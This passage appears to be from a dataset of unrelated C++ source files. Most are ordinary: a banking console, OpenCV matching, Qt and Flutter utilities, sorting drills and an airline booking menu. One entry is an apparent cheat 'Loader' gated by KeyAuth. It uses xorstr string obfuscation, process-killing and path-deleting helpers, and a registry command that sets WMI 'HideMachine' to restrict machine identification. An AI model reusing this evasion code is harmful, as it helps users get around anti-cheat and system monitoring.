       }\r\n    }\r\n\r\n    // Back substitution\r\n    vector<double> result(n);\r\n    for (int i = n - 1; i >= 0; i--) {\r\n        result[i] = matrix[i][n];\r\n        for (int j = i + 1; j < n; j++) {\r\n            result[i] -= matrix[i][j] * result[j];\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\nint main() {\r\n    // Open and read JSON file\r\n    ifstream inputFile(\"testcase2.json\");\r\n    if (!inputFile.is_open()) {\r\n        cerr << \"Failed to open file.\" << endl;\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // Parse the JSON data from file\r\n    json jsonData;\r\n    try {\r\n        inputFile >> jsonData;\r\n    } catch (const json::exception& e) {\r\n        cerr << \"Failed to parse JSON: \" << e.what() << endl;\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    \r\n    inputFile.close();\r\n\r\n    // Extract n and k from the JSON\r\n    int n = jsonData[\"keys\"][\"n\"];  \r\n    int k = jsonData[\"keys\"][\"k\"]; \r\n\r\n    // Map to store the (x, y) points\r\n    map<int, long long> points;\r\n\r\n    // Loop through the JSON data to extract x and y values\r\n    for (auto& el : jsonData.items()) {\r\n        if (el.key() == \"keys\") continue;  \r\n\r\n        int x = stoi(el.key());                        // Extract the x-value (key)\r\n        int base = stoi(el.value()[\"base\"].get<string>());  // Extract the base\r\n        string y_str = el.value()[\"value\"];            // Extract the y value as a string\r\n        long long y = decodeBase(y_str, base);         // Decode y value using the base\r\n\r\n        points[x] = y;  \r\n    }\r\n\r\n    \r\n    vector<pair<int, long long>> selected_points;\r\n    int count = 0;\r\n    for (const auto& point : points) {\r\n        if (count >= k) break;  \r\n        selected_points.push_back(point);\r\n        count++;\r\n    }\r\n\r\n    if (selected_points.size() < k) {\r\n        cerr << \"Insufficient points provided.\" << endl;\r\n        return EXIT_FAILURE;\r\n    }\r\n\r\n    // Construct the matrix for Gaussian elimination (k equations for (k-1)th degree polynomial)\r\n    vector<vector<double>> matrix(k, vector<double>(k + 1, 0));  \r\n\r\n    for (int i = 0; i < k; i++) {\r\n        int x = selected_points[i].first;\r\n        long long y = selected_points[i].second;\r\n\r\n        for (int j = 0; j < k; j++) {\r\n            matrix[i][j] = pow(x, k - j - 1);  \r\n        }\r\n        matrix[i][k] = y; \r\n    }\r\n\r\n    // Perform Gaussian elimination to solve for polynomial coefficients\r\n    vector<double> result = gaussianElimination(matrix, k);\r\n\r\n    // Output the polynomial coefficients and the constant term\r\n    cout << \"The polynomial is: \";\r\n    for (int i = 0; i < k; i++) {\r\n        if (i > 0) cout << \" + \";\r\n        cout << result[i] << \"x^\" << (k - i - 1);\r\n    }\r\n    cout << \" = \" << result[k] << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#Developed by Bootkitt\n\n#include <Windows.h>\n#include <string>\n#include <filesystem>\n#include <iostream>\n#include <vector>\n#include \"auth.hpp\"\n#include \"utils.hpp\"\n#include \"skStr.h\"\n\nnamespace fs = std::filesystem;\n\nstd::string tm_to_readable_time(tm ctx);\nstatic std::time_t string_to_timet(std::string timestamp);\nstatic std::tm timet_to_tm(time_t timestamp);\n\nconst std::string compilation_date = xorstr_(__DATE__);\nconst std::string compilation_time = xorstr_(__TIME__);\n\nbool AddRegistryValue(const std::wstring& keyPath, const std::wstring& valueName, DWORD valueData) {\n    HKEY hKey;\n    LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey);\n    if (result == ERROR_SUCCESS) {\n        result = RegSetValueExW(hKey, valueName.c_str(), 0, REG_DWORD, reinterpret_cast<const BYTE*>(&valueData), sizeof(valueData));\n        RegCloseKey(hKey);\n    }\n    return result == ERROR_SUCCESS;\n}\n\nvoid TaskKill(const std::wstring& processName, int times) {\n    for (int i = 0; i < times; ++i) {\n        std::wstring command = xorstr_(L\"taskkill /F /IM \") + processName;\n        _wsystem(command.c_str());\n    }\n}\n\nvoid HideRegistryOperation() {\n    std::wstring command = xorstr_(L\"reg add HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Restrictions /v HideMachine /t REG_DWORD /d 1 /F\");\n    _wsystem(command.c_str());\n}\n\nusing namespace KeyAuth;\n\nstd::string name = xorstr_(\"Projectid\");\nstd::string ownerid = xorstr_(\"Ownerid\");\nstd::string secret = xorstr_(\"YourSecret\");\nstd::string version = xorstr_(\"1.0\");\nstd::string url = xorstr_(\"https://keyauth.win/api/1.2/\");\nstd::string path = xorstr_(\"\");\n\napi KeyAuthApp(name, ownerid, secret, version, url, path);\n\nvoid SetConsoleColors() {\n    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n    DWORD dwMode = 0;\n    GetConsoleMode(hConsole, &dwMode);\n    dwMode |= ENABLE_VIRTUAL_TERMINAL_PROCESSING;\n    SetConsoleMode(hConsole, dwMode);\n}\n\nvoid OpenURL(const std::wstring& url) {\n    HINSTANCE result = ShellExecuteW(NULL, xorstr_(L\"open\"), url.c_str(), NULL, NULL, SW_SHOWNORMAL);\n\n    if ((int)result <= 32) {\n        std::wcerr << xorstr_(L\"Failed to open URL. Error code: \") << (int)result << std::endl;\n    }\n}\n\nbool DeletePath(const fs::path& path) {\n    try {\n        if (fs::exists(path)) {\n            if (fs::is_directory(path)) {\n                fs::remove_all(path);\n            }\n            else {\n                fs::remove(path);\n            }\n            return true;\n        }\n    }\n    catch (const fs::filesystem_error& e) {\n        std::cerr << xorstr_(\"Error deleting \") << path << \": \" << e.what() << std::endl;\n    }\n    return false;\n}\n\nint main()\n{\n    // Initialize console to support ANSI codes\n    SetConsoleColors();\n\n    // Freeing memory to prevent memory leak or memory scraping\n    name.clear(); ownerid.clear(); secret.clear(); version.clear(); url.clear();\n    std::string consoleTitle = xorstr_(\"Loader - Built at: \") + compilation_date + \" \" + compilation_time;\n    SetConsoleTitleA(consoleTitle.c_str());\n\n    const std::string greenColor = \"\\033[32m\";\n    const std::string redColor = \"\\033[31m\";\n    const std::string resetColor = \"\\033[0m\";\n\n    std::cout << redColor << xorstr_(R\"(\n__       ______                     __          _       __            ____         \n\\ \\     / ____/  _____  _______  __/ /____     | |     / /___  ____  / __/__  _____\n \\ \\   / __/ | |/_/ _ \\/ ___/ / / / __/ _ \\    | | /| / / __ \\/ __ \\/ /_/ _ \\/ ___/\n / /  / /____>  </  __/ /__/ /_/ / /_/  __/    | |/ |/ / /_/ / /_/ / __/  __/ /    \n/_/  /_____/_/|_|\\___/\\___/\\__,_/\\__/\\___/     |__/|__/\\____/\\____/_/  \\___/_/     \n  \ndiscord.gg/executor                                                                                                  \nt.me/executeos)\") << resetColor << std::endl;\n\n    KeyAuthApp.init();\n    if (!KeyAuthApp.response.success)\n    {\n        std::cout << xorstr_(\"Status: \") << redColor << KeyAuthApp.response.message << resetColor << std::endl;\n        Sleep(1500);\n        exit(1);\n    }\n\n    if (fs::exists(\"Auth.json\"))\n    {\n        if (!CheckIfJsonKeyExists(\"Auth.json\", \"username\"))\n        {\n            std::string key = ReadFromJson(\"Auth.json\", \"license\");\n            KeyAuthApp.license(key);\n            if (!KeyAuthApp.response.success)\n            {\n                std::remove(\"Auth.json\");\n                std::cout << xorstr_(\"Status: \") << redColor << KeyAuthApp.response.message << resetColor << std::endl;\n                Sleep(1500);\n                exit(1);\n            }\n        }\n        else\n        {\n            std::string username = ReadFromJson(\"Auth.json\", \"username\");\n            std::string password = ReadFromJson(\"Auth.json\", \"password\");\n            KeyAuthApp.login(username, password);\n            if (!KeyAuthApp.response.success)\n            {\n                std::remove(\"Auth.json\");\n                std::cout << xorstr_(\"Status: \") << redColor << KeyAuthApp.response.message << resetColor << std::endl;\n               ",
    "\n#include<iostream>\n #include<fstream>\n #include<cstdlib>\n #include<vector>\n #include<map>\n using namespace std;\n #define MIN_BALANCE 500\n class InsufficientFunds{};\n class Account\n {\n private:\n    long accountNumber;\n    string firstName;\n    string lastName;\n    float balance;\n    static long NextAccountNumber;\n public:\n    Account(){}\n    Account(string fname,string lname,float balance);\n    long getAccNo(){return accountNumber;}\n    string getFirstName(){return firstName;}\n    string getLastName(){return lastName;}\n    float getBalance(){return balance;}\n    \n    void Deposit(float amount);\n    void Withdraw(float amount);\n    static void setLastAccountNumber(long accountNumber);\n    static long getLastAccountNumber();\n    friend ofstream & operator<<(ofstream &ofs,Account &acc);\n    friend ifstream & operator>>(ifstream &ifs,Account &acc);\n    friend ostream & operator<<(ostream &os,Account &acc);\n };\n long Account::NextAccountNumber=0;\n class Bank\n {\n private:\n    map<long,Account> accounts;\n public:\n    Bank();\n    Account OpenAccount(string fname,string lname,float balance);\n    Account BalanceEnquiry(long accountNumber);\n    Account Deposit(long accountNumber,float amount);\n    Account Withdraw(long accountNumber,float amount);\n    void CloseAccount(long accountNumber);\n    void ShowAllAccounts();\n    ~Bank();\n };\n int main()\n {\n    Bank b;\n    Account acc;\n    \n    int choice;\n    string fname,lname;\n    long accountNumber;\n    float balance;\n    float amount;\n    cout<<\"***Banking System***\"<<endl;\n    do\n    {\n        cout<<\"\\n\\tSelect one option below \";\n        cout<<\"\\n\\t1 Open an Account\";\n        cout<<\"\\n\\t2 Balance Enquiry\";\n        cout<<\"\\n\\t3 Deposit\";\n        cout<<\"\\n\\t4 Withdrawal\";\n        cout<<\"\\n\\t5 Close an Account\";\n        cout<<\"\\n\\t6 Show All Accounts\";\n        cout<<\"\\n\\t7 Quit\";\n        cout<<\"\\nEnter your choice: \";\n        cin>>choice;\n        switch(choice)\n        {\n            case 1:\n                cout<<\"Enter First Name: \";\n                cin>>fname;\n                cout<<\"Enter Last Name: \";\n                cin>>lname;\n                cout<<\"Enter initil Balance: \";\n                cin>>balance;\n                acc=b.OpenAccount(fname,lname,balance);\n                cout<<endl<<\"Congradulation Account is Created\"<<endl;\n                cout<<acc;\n                break;\n            case 2:\n                cout<<\"Enter Account Number:\";\n                cin>>accountNumber;\n                acc=b.BalanceEnquiry(accountNumber);\n                cout<<endl<<\"Your Account Details\"<<endl;\n                cout<<acc;\n                break;\n            case 3:\n                cout<<\"Enter Account Number:\";\n                cin>>accountNumber;\n                cout<<\"Enter Balance:\";\n                cin>>amount;\n                acc=b.Deposit(accountNumber, amount);\n                cout<<endl<<\"Amount is Deposited\"<<endl;\n                cout<<acc;\n                \n                break;\n            case 4:\n                cout<<\"Enter Account Number:\";\n                cin>>accountNumber;\n                cout<<\"Enter Balance:\";\n                cin>>amount;\n                acc=b.Withdraw(accountNumber, amount);\n                cout<<endl<<\"Amount Withdrawn\"<<endl;\n                cout<<acc;\n                break;\n            case 5:\n                cout<<\"Enter Account Number:\";\n                cin>>accountNumber;\n                b.CloseAccount(accountNumber);\n                cout<<endl<<\"Account is Closed\"<<endl;\n                cout<<acc;\n            case 6:\n                b.ShowAllAccounts();\n                break;\n            case 7: break;\n            default:\n                cout<<\"\\nEnter corret choice\";\n                exit(0);\n        }\n    }while(choice!=7);\n    \n    return 0;\n }\n Account::Account(string fname,string lname,float balance)\n {\n    NextAccountNumber++;\n    accountNumber=NextAccountNumber;\n    firstName=fname;\n    lastName=lname;\n    this->balance=balance;\n }\n void Account::Deposit(float amount)\n {\n    balance+=amount;\n }\n void Account::Withdraw(float amount)\n {\n    if(balance-amount<MIN_BALANCE)\n        throw InsufficientFunds();\n    balance-=amount;\n }\n void Account::setLastAccountNumber(long accountNumber)\n {\n    NextAccountNumber=accountNumber;\n }\n long Account::getLastAccountNumber()\n {\n    return NextAccountNumber;\n }\n ofstream & operator<<(ofstream &ofs,Account &acc)\n {\n    ofs<<acc.accountNumber<<endl;\n    ofs<<acc.firstName<<endl;\n    ofs<<acc.lastName<<endl;\n    ofs<<acc.balance<<endl;\n    return ofs;\n }\n ifstream & operator>>(ifstream &ifs,Account &acc)\n {\n    ifs>>acc.accountNumber;\n    ifs>>acc.firstName;\n    ifs>>acc.lastName;\n    ifs>>acc.balance;\n    return ifs;\n    \n}\n ostream & operator<<(ostream &os,Account &acc)\n {\n    os<<\"First Name:\"<<acc.getFirstName()<<endl;\n    os<<\"Last Name:\"<<acc.getLastName()<<endl;\n    os<<\"Account Number:\"<<acc.getAccNo()<<endl;\n    os<<\"Balance:\"<<acc.getBalance()<<endl;\n    return os;\n }\n Bank::Bank()\n {\n ",
    "\n#include <numeric>\n#include \"matching2D.hpp\"\n\nusing namespace std;\n\n// Find best matches for keypoints in two camera images based on several matching methods\nvoid matchDescriptors(std::vector<cv::KeyPoint> &kPtsSource, std::vector<cv::KeyPoint> &kPtsRef, cv::Mat &descSource, cv::Mat &descRef,\n                      std::vector<cv::DMatch> &matches, std::string descriptorType, std::string matcherType, std::string selectorType)\n{\n    // configure matcher\n    bool crossCheck = false;\n    cv::Ptr<cv::DescriptorMatcher> matcher;\n\n    if (matcherType.compare(\"MAT_BF\") == 0)\n    {\n       //int normType = cv::NORM_HAMMING;\n       int normType = cv::NORM_L2;\n        matcher = cv::BFMatcher::create(normType, crossCheck);\n    }\n    else if (matcherType.compare(\"MAT_FLANN\") == 0)\n    {\n        // ...\n        matcher = cv::FlannBasedMatcher::create();\n    }\n\n    // perform matching task\n    if (selectorType.compare(\"SEL_NN\") == 0)\n    { // nearest neighbor (best match)\n        \n        matcher->match(descSource, descRef, matches); // Finds the best match for each descriptor in desc1\n        \n    }\n    else if (selectorType.compare(\"SEL_KNN\") == 0)\n    { // k nearest neighbors (k=2)\n\n        // ... \n        const float ratio_thres = 0.8f; //Ratio Threshold\n        std::vector<std::vector<cv::DMatch>> knnMatches;\n        matcher->knnMatch(descSource, descRef, knnMatches, 2);\n        for (const auto& knnMatch : knnMatches){\n            if (knnMatch[0].distance < ratio_thres * knnMatch[1].distance ){\n                matches.push_back(knnMatch[0]);\n            }\n        }\n\n    }\n}\n\n// Use one of several types of state-of-art descriptors to uniquely identify keypoints\nvoid descKeypoints(vector<cv::KeyPoint> &keypoints, cv::Mat &img, cv::Mat &descriptors, string descriptorType)\n{\n    // select appropriate descriptor\n    cv::Ptr<cv::DescriptorExtractor> extractor;\n    if (descriptorType.compare(\"BRISK\") == 0)\n    {\n\n        int threshold = 30;        // FAST/AGAST detection threshold score.\n        int octaves = 3;           // detection octaves (use 0 to do single scale)\n        float patternScale = 1.0f; // apply this scale to the pattern used for sampling the neighbourhood of a keypoint.\n\n        extractor = cv::BRISK::create(threshold, octaves, patternScale);\n    }\n    else if (descriptorType.compare(\"BRIEF\") == 0)\n    {\n        int bytes = 16; //Length of descriptor in bytes\n\n        extractor = cv::xfeatures2d::BriefDescriptorExtractor::create(bytes);\n\n        //...\n    }\n    else if (descriptorType.compare(\"ORB\") == 0)\n    {\n        \n            extractor = cv::ORB::create();\n        //...\n    }\n    else if (descriptorType.compare(\"FREAK\") == 0)\n    {\n        int bytes = 16; //Length of descriptor in bytes\n\n        extractor = cv::xfeatures2d::FREAK::create();\n\n        //...\n    }\n    else if (descriptorType.compare(\"AKAZE\") == 0)\n    {\n        int bytes = 16; //Length of descriptor in bytes\n\n        extractor = cv::AKAZE::create();\n\n        //...\n    }\n    else if (descriptorType.compare(\"SIFT\") == 0)\n    {\n        \n            extractor = cv::xfeatures2d::SIFT::create();\n        //...\n    }\n\n    // perform feature description\n    double t = (double)cv::getTickCount();\n    extractor->compute(img, keypoints, descriptors);\n    t = ((double)cv::getTickCount() - t) / cv::getTickFrequency();\n    cout << descriptorType << \" descriptor extraction in \" << 1000 * t / 1.0 << \" ms\" << endl;\n}\n\n// Detect keypoints in image using the traditional Shi-Thomasi detector\nvoid detKeypointsShiTomasi(vector<cv::KeyPoint> &keypoints, cv::Mat &img, bool bVis)\n{\n    // compute detector parameters based on image size\n    int blockSize = 4;       //  size of an average block for computing a derivative covariation matrix over each pixel neighborhood\n    double maxOverlap = 0.0; // max. permissible overlap between two features in %\n    double minDistance = (1.0 - maxOverlap) * blockSize;\n    int maxCorners = img.rows * img.cols / max(1.0, minDistance); // max. num. of keypoints\n\n    double qualityLevel = 0.01; // minimal accepted quality of image corners\n    double k = 0.04;\n\n    // Apply corner detection\n    double t = (double)cv::getTickCount();\n    vector<cv::Point2f> corners;\n    cv::goodFeaturesToTrack(img, corners, maxCorners, qualityLevel, minDistance, cv::Mat(), blockSize, false, k);\n\n    // add corners to result vector\n    for (auto it = corners.begin(); it != corners.end(); ++it)\n    {\n\n        cv::KeyPoint newKeyPoint;\n        newKeyPoint.pt = cv::Point2f((*it).x, (*it).y);\n        newKeyPoint.size = blockSize;\n        keypoints.push_back(newKeyPoint);\n    }\n    t = ((double)cv::getTickCount() - t) / cv::getTickFrequency();\n    cout << \"Shi-Tomasi detection with n=\" << keypoints.size() << \" keypoints in \" << 1000 * t / 1.0 << \" ms\" << endl;\n\n    // visualize results\n    if (bVis)\n    {\n        cv::Mat visImage = img.clone();\n        cv::drawKeypoints(img, keypoints, visImage, cv::Scalar::all(-1), cv::DrawMatchesFlags::DRAW_RICH_KEYPOINT",
    "#include \"markeritem.h\"\n#include <QStyleOptionGraphicsItem>\n#include <QColor>\n#include <QPen>\n#include <QPainter>\n\nMarkerItem::MarkerItem(QGraphicsItem* parent)\n: QObject(nullptr), QGraphicsRectItem(-3.5, -3.5, 7, 7, parent), m_smooth(false)\n{\n  setFlag(QGraphicsItem::ItemIgnoresTransformations, true);\n  setFlag(QGraphicsItem::ItemIgnoresParentOpacity, true);\n  setFlag(QGraphicsItem::ItemSendsGeometryChanges, true);\n  setZValue(1);\n  QPen pen(Qt::black, 1);\n  pen.setCosmetic(true);\n  setPen(pen);\n  setSmooth(m_smooth);\n}\n\nQColor MarkerItem::color() const\n{\n  return brush().color();\n}\n\nvoid MarkerItem::setHighlight(const QColor& color)\n{\n  highlightColor = color;\n}\n\nvoid MarkerItem::setColor(const QColor& color)\n{\n  setBrush(color);\n  emit colorChanged(this, color);\n}\n\nbool MarkerItem::isSmooth() const\n{\n  return m_smooth;\n}\n\nvoid MarkerItem::setSmooth(bool on)\n{\n  m_smooth = on;\n  update();\n  emit smoothChanged(this, on);\n}\n\nvoid MarkerItem::paint(QPainter* painter, const QStyleOptionGraphicsItem* option, QWidget*)\n{\n  if (!visible) {\n    return;\n  }\n  // Snap coordinates to device pixels to avoid fuzzy edges\n  double xFrac = painter->deviceTransform().dx();\n  xFrac = xFrac - int(xFrac);\n\n  double yFrac = painter->deviceTransform().dy();\n  yFrac = yFrac - int(yFrac);\n\n  QRectF r = rect().adjusted(-xFrac, -yFrac, -xFrac, -yFrac);\n  QPen p = pen();\n  p.setWidth(3);\n  painter->setPen(p);\n  painter->setBrush(brush());\n  drawFrame(painter, r.adjusted(-1, -1, 1, 1));\n  if (option->state & QStyle::State_Selected) {\n    p.setColor(option->palette.color(QPalette::Highlight));\n  } else {\n    p.setColor(highlightColor);\n  }\n  p.setWidthF(m_smooth ? 1.6 : 1.0);\n  painter->setPen(p);\n  painter->setBrush(Qt::transparent);\n  drawFrame(painter, r.adjusted(-1, -1, 1, 1));\n}\n\nvoid MarkerItem::drawFrame(QPainter* painter, const QRectF& rect)\n{\n  if (m_smooth) {\n    painter->drawEllipse(rect);\n  } else {\n    painter->drawRect(rect);\n  }\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\nusing namespace std;\n\n// Function to perform Selection Sort\nvoid selectionSort(int arr[], int size) {\n    for (int i = 0; i < size - 1; i++) {\n        // Find the index of the minimum element in the unsorted part\n        int minIndex = i;\n        for (int j = i + 1; j < size; j++) {\n            if (arr[j] < arr[minIndex]) {\n                minIndex = j;\n            }\n        }\n        // Swap the found minimum element with the first element\n        swap(arr[i], arr[minIndex]);\n    }\n}\n\n// Function to print the array\nvoid printArray(int arr[], int size) {\n    for (int i = 0; i < size; i++) {\n        cout << arr[i] << \" \";\n    }\n    cout << endl;\n}\n\nint main() {\n    const int size = 10; // Maximum size of the array\n    int array[size];\n\n    // User input\n    cout << \"Enter \" << size << \" numbers:\" << endl;\n    for (int i = 0; i < size; i++) {\n        cin >> array[i];\n    }\n\n    // Perform Selection Sort\n    selectionSort(array, size);\n\n    // Print the sorted array\n    cout << \"Sorted array:\" << endl;\n    printArray(array, size);\n\n    return 0;\n}\n\n\n// Selection Sort Function: The selectionSort function implements the Selection Sort algorithm. It repeatedly finds the minimum element from the unsorted part of the array and swaps it with the first unsorted element.\n\n// User Input: The program prompts the user to enter 10 numbers, which are stored in a one-dimensional array.\n\n// Sorting and Output: After sorting the array using Selection Sort, the program prints the sorted array.",
    "#include <iostream>\n#include <string>\n\nint main(void)\n{\n    int color{};\n    int age{};\n    bool canHaveDrink{};\n    std::string answer{};\n    // std::cout << \"Enter a number from 1 to 5 \";\n    // std::cin >> color;\n\n    /* if-else*/\n\n    // if (color == \"red\")\n    // {\n    //     std::cout << \"The color is red\" << std::endl;\n    // }\n    // else if (color == \"blue\")\n    // {\n    //     std::cout << \"The color is blue\" << std::endl;\n    // }\n    // else if (color == \"white\")\n    // {\n    //     std::cout << \"The color is white\" << std::endl;\n    // }\n    // else\n    // {\n    //     std::cout << \"You haven't chosen the color\" << std::endl;\n    // }\n    // return 0;\n\n    /* case */\n    // switch (color)\n    // {\n    // case 1:\n    //     std::cout << \"The color is blue\" << std::endl;\n    //     break;\n    // case 2:\n    //     std::cout << \"The color is red\" << std::endl;\n    //     break;\n    // case 3:\n    //     std::cout << \"The color is green\" << std::endl;\n    //     break;\n    // case 4:\n    //     std::cout << \"The color is white\" << std::endl;\n    //     break;\n    // case 5:\n    //     std::cout << \"The color is black\" << std::endl;\n    //     break;\n    // default:\n    //     std::cout << \"You haven't chosen the color\" << std::endl;\n    // }\n\n    /* Logical operators */\n    // std::cout << \"Enter your age \";\n    // std::cin >> age;\n    // if (age >= 21 && age <= 80)\n    // {\n    //     std::cout << \"You can have a drink\" << std::endl;\n    // }\n    // else if (age < 21)\n    // {\n    //     std::cout << \"You're a little bit too young to have a drink\" << std::endl;\n    // }\n    // else\n    // {\n    //     std::cout << \"Sorry, no drink for you, sir\" << std::endl;\n    // }\n\n    /* Ternary operator in C++ */\n    std::cout << \"Enter your age please: \";\n    std::cin >> age;\n    answer = (age >= 21) ? \"You can have a drink\" : \"Sorry, no drink available for you today\";\n    std::cout << answer << std::endl;\n}",
    "\n////////////////////////////////////////////////////////////\n// Headers\n////////////////////////////////////////////////////////////\n#include <iostream>\n#include <cstdlib>\n\n\nvoid runTcpServer(unsigned short port);\nvoid runTcpClient(unsigned short port);\nvoid runUdpServer(unsigned short port);\nvoid runUdpClient(unsigned short port);\n\n\n////////////////////////////////////////////////////////////\n/// Entry point of application\n///\n/// \\return Application exit code\n///\n////////////////////////////////////////////////////////////\nint main()\n{\n    // Choose an arbitrary port for opening sockets\n    const unsigned short port = 50001;\n\n    // TCP, UDP or connected UDP ?\n    char protocol;\n    std::cout << \"Do you want to use TCP (t) or UDP (u)? \";\n    std::cin  >> protocol;\n\n    // Client or server ?\n    char who;\n    std::cout << \"Do you want to be a server (s) or a client (c)? \";\n    std::cin  >> who;\n\n    if (protocol == 't')\n    {\n        // Test the TCP protocol\n        if (who == 's')\n            runTcpServer(port);\n        else\n            runTcpClient(port);\n    }\n    else\n    {\n        // Test the unconnected UDP protocol\n        if (who == 's')\n            runUdpServer(port);\n        else\n            runUdpClient(port);\n    }\n\n    // Wait until the user presses 'enter' key\n    std::cout << \"Press enter to exit...\" << std::endl;\n    std::cin.ignore(10000, '\\n');\n    std::cin.ignore(10000, '\\n');\n\n    return EXIT_SUCCESS;\n}\n",
    "#include\"time.h\"\n#include\"Graph.h\"\n#include \"Date.h\"\n#include<Windows.h>\n#include<iostream>\n#include<string>\n#include<fstream>\n#include\"file_handling.h\"\n#include\"ini.h\"\nusing namespace std;\nvoid display()\n{\n\tstring origin;\n\tstring desti;\n\tstring transit;\n\tstring cost;\n\tstring airline;\n\tint year, month, day;\n\tint transit_time;\n\tint input;\n\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 4);\n\tcout << \"-----------------------------------WELCOME TO THE airline RESERVATION SYSTEM--------------------------------------\" << endl;\n\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);\n\tcout << \"--> Please select your query from the list mentioned below\" << endl;\n\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 5);\n\tcout << \"--> Press 1 if you want to book a flight of a certain airline going to a certain destination\" << endl << \"    on a specific date with minimal travel cost\" << endl;\n\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 6);\n\tcout << \"--> Press 2 if you want to book a fight going to a certain destination on a specific date with minimal travel time\" << endl;\n\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);\n\tcout << \"--> Press 3 if you want to book a connecting flight going to a certain destination on a specific date with a transit\" << endl;\n\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);\n\tcout << \"--> Press 4 if you want to book a connecting flight going to a certain destination on a specific\" << endl << \"    date having a particular transit time with minimum travel time \" << endl;\n\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 8);\n\tcout << \"--> Press 5 if you want to book a direct flight going to a certain destination on a specific date and time\" << endl;\n\tcin >> input;\n\tcout << \"---------------------------------------------------------------------------------------------------------------------\" << endl;\n\tif (input == 1) {\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 1);\n\t\tcout << \"Please fill in the following requirements to book your air travel\" << endl;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 5);\n\t\tcout << \"Enter your origin of air travel : \";\n\t\tcin >> origin;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 6);\n\t\tcout << \"Enter your destination of air travel : \";\n\t\tcin >> desti;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);\n\t\tcout << \"Enter your Date of air travel\" << endl;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 8);\n\t\tcout << \"Enter day of your travel : \";\n\t\tcin >> day;\n\t\tcout << \"Enter month of your travel : \";\n\t\tcin >> month;\n\t\tcout << \"Enter year of your travel : \";\n\t\tcin >> year;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);\n\t\tcout << \"Enter the name of your preferred airline : \";\n\t\tcin >> airline;\n\t\tinitializer in;\n\t\tin.origin = origin;\n\t\tin.destination = desti;\n\t\tin.airline = airline;\n\t\tDate s1_d(day, month, year);\n\t\tin.d = s1_d;\n\t\tinitiate(in, input);\n\t}\n\telse if (input == 2) {\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 1);\n\t\tcout << \"Please fill in the following requirements to book your air travel\" << endl;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 5);\n\t\tcout << \"Enter your origin of air travel : \";\n\t\tcin >> origin;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 6);\n\t\tcout << \"Enter your destination of air travel : \";\n\t\tcin >> desti;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);\n\t\tcout << \"Enter your Date of air travel\" << endl;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 8);\n\t\tcout << \"Enter day of your travel : \";\n\t\tcin >> day;\n\t\tcout << \"Enter month of your travel : \";\n\t\tcin >> month;\n\t\tcout << \"Enter year of your travel : \";\n\t\tcin >> year;\n\t\tDate s2_d(day, month, year);\n\t\tinitializer in;\n\t\tin.origin = origin;\n\t\tin.destination = desti;\n\t\tin.d = s2_d;\n\t\tinitiate(in, input);\n\t}\n\telse if (input == 3) {\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 1);\n\t\tcout << \"Please fill in the following requirements to book your air travel\" << endl;\n\t\tSetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 